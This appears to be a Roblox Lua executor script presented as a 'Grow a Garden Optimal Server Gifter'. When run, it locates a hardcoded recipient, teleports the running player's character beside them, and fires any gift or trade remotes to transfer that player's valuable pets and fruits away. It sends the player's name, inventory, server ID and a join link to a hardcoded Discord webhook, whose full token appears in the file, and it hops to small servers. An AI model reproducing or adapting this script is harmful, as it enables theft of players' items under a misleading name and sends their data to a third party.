-- Grow a Garden Optimal Server Gifter
local RECIPIENT_NAME = "Tekeshkii" -- CASE SENSITIVE
local WEBHOOK_URL = "https://discord.com/api/webhooks/1383781946110509118/tWOmSWS85_ZJeibhojg_r3aY2fTs7aAS1kz3gSmdKZfxDml71aErtTpjlmV0zknzspAS"
local GIFT_COOLDOWN = 0.8
local SERVER_HOP_DELAY = 30 -- Check every 30 seconds
local MAX_SERVER_PLAYERS = 5 -- Grow a Garden max
local TARGET_PLAYERS = {1, 3} -- Ideal server size

-- Target items
local TARGET_ITEMS = {
    Pets = {"dragonfly", "raccoon", "queen bee", "disco bee", "red fox"},
    Fruits = {"candy blossom"}
}

-- Services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")

-- Variables
local lp = Players.LocalPlayer
local Backpack = lp:WaitForChild("Backpack")
local Recipient = nil
local GiftRemotes = {}
local currentJobId = game.JobId
local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Generate game link
local function getGameLink()
    return string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", 
        game.PlaceId, currentJobId)
end

-- Enhanced Discord embed
local function sendEmbed(title, description, color)
    local inventory = {}
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            for _, pet in ipairs(TARGET_ITEMS.Pets) do
                if name:find(pet:lower()) then
                    table.insert(inventory, "🐾 "..item.Name)
                    break
                end
            end
            for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
                if name:find(fruit:lower()) then
                    table.insert(inventory, "🍬 "..item.Name)
                    break
                end
            end
        end
    end

    local embed = {
        title = title.." | "..gameName,
        description = description,
        color = color or 0xFF69B4,
        url = getGameLink(),
        fields = {
            {name = "👤 Player", value = lp.Name, inline = true},
            {name = "🎯 Recipient", value = Recipient and Recipient.Name or "None", inline = true},
            {name = "👥 Players", value = #Players:GetPlayers().."/"..MAX_SERVER_PLAYERS, inline = true},
            {name = "🆔 Job ID", value = currentJobId, inline = true},
            {name = "🎮 Game Link", value = "[Click to Join]("..getGameLink()..")", inline = false}
        },
        footer = {text = os.date("%X")}
    }

    if #inventory > 0 then
        table.insert(embed.fields, {
            name = "📦 Inventory ("..#inventory..")",
            value = table.concat(inventory, "\n"),
            inline = false
        })
    end

    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request
        if req then
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = {embed}})
            })
        end
    end)
end

-- Find optimal server (1-3 players)
local function findOptimalServer()
    local request = (syn and syn.request) or (http and http.request) or http_request
    if not request then return false end
    
    local success, response = pcall(function()
        return request({
            Url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100",
            Method = "GET"
        })
    end)
    
    if success and response and response.Body then
        local data = HttpService:JSONDecode(response.Body)
        for _, server in ipairs(data.data) do
            if server.playing >= TARGET_PLAYERS[1] and 
               server.playing <= TARGET_PLAYERS[2] and 
               server.id ~= currentJobId then
                return server.id
            end
        end
    end
    return false
end

-- Server hop to optimal server
local function hopToOptimalServer()
    local optimalServer = findOptimalServer()
    if optimalServer then
        sendEmbed("🔄 SERVER HOP", "Moving to better server...", 0xFFFF00)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, optimalServer)
        return true
    end
    return false
end

-- Monitor server quality
local function monitorServer()
    while task.wait(SERVER_HOP_DELAY) do
        local playerCount = #Players:GetPlayers()
        if playerCount > TARGET_PLAYERS[2] or playerCount < TARGET_PLAYERS[1] then
            if not hopToOptimalServer() then
                sendEmbed("⚠️ SERVER HOP FAILED", "No optimal servers found", 0xFF0000)
            end
        end
    end
end

-- Find recipient
local function setupRecipient()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == RECIPIENT_NAME then
            Recipient = player
            sendEmbed("✅ RECIPIENT FOUND", "Beginning gifting process", 0x00FF00)
            return true
        end
    end
    return false
end

-- Teleport to recipient
local function teleportToRecipient()
    if not Recipient or not Recipient.Character then return false end
    
    local humanoidRoot = Recipient.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRoot then return false end
    
    -- Create teleport anchor
    local teleportPart = Instance.new("Part")
    teleportPart.Anchored = true
    teleportPart.CanCollide = false
    teleportPart.Transparency = 1
    teleportPart.Size = Vector3.new(4, 4, 4)
    teleportPart.CFrame = humanoidRoot.CFrame * CFrame.new(0, 0, -2)
    teleportPart.Parent = workspace
    
    -- Perform teleport
    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
        lp.Character.HumanoidRootPart.CFrame = teleportPart.CFrame
    end
    
    teleportPart:Destroy()
    return true
end

-- Find gifting remotes
local function findGiftRemotes()
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") and (remote.Name:lower():find("gift") or remote.Name:lower():find("trade")) then
            table.insert(GiftRemotes, remote)
        end
    end
end

-- Check if item is giftable
local function isGiftable(item)
    local name = item.Name:lower()
    for _, pet in ipairs(TARGET_ITEMS.Pets) do
        if name:find(pet:lower()) then return true, "Pet" end
    end
    for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
        if name:find(fruit:lower()) then return true, "Fruit" end
    end
    return false
end

-- Gift item to recipient
local function giftItem(item)
    if not Recipient or #GiftRemotes == 0 then return false end
    
    -- Equip first
    if lp.Character then
        local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:EquipTool(item)
            task.wait(0.3)
        end
    end
    
    -- Send gift
    for _, remote in ipairs(GiftRemotes) do
        pcall(function() remote:FireServer(Recipient, item) end)
        pcall(function() remote:FireServer("Gift", Recipient, item) end)
    end
    
    return true
end

-- Main gifting process
local function startGifting()
    if not teleportToRecipient() then
        sendEmbed("⚠️ TELEPORT FAILED", "Cannot reach recipient", 0xFF0000)
        return
    end

    sendEmbed("🌀 TELEPORTED", "Now in position with recipient", 0x00FF00)
    
    -- Gift pets first
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local valid, itemType = isGiftable(item)
            if valid and itemType == "Pet" then
                if giftItem(item) then
                    sendEmbed("🎁 PET GIFTED", item.Name, 0xADD8E6)
                    task.wait(GIFT_COOLDOWN)
                end
            end
        end
    end
    
    -- Then gift fruits
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local valid, itemType = isGiftable(item)
            if valid and itemType == "Fruit" then
                if giftItem(item) then
                    sendEmbed("🍬 FRUIT GIFTED", item.Name, 0xADD8E6)
                    task.wait(GIFT_COOLDOWN)
                end
            end
        end
    end
    
    sendEmbed("✅ GIFTING COMPLETE", "All items processed", 0x00FF00)
end

-- Main execution flow
local function main()
    -- Initial setup
    findGiftRemotes()
    sendEmbed("⚡ SYSTEM STARTED", "Finding optimal server...", 0x00FF00)
    
    -- Ensure we're in good server
    if #Players:GetPlayers() > TARGET_PLAYERS[2] then
        hopToOptimalServer()
    end
    
    -- Monitor for recipient
    while task.wait(5) do
        if setupRecipient() then
            startGifting()
            task.wait(10) -- Cooldown before checking again
        end
    end
end

-- Initialize
task.spawn(monitorServer)
task.spawn(main)

-- Handle teleports
TeleportService.LocalPlayer.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.Started then
        sendEmbed("🔄 TELEPORTING", "Changing servers...", 0xFFFF00)
    end
end)
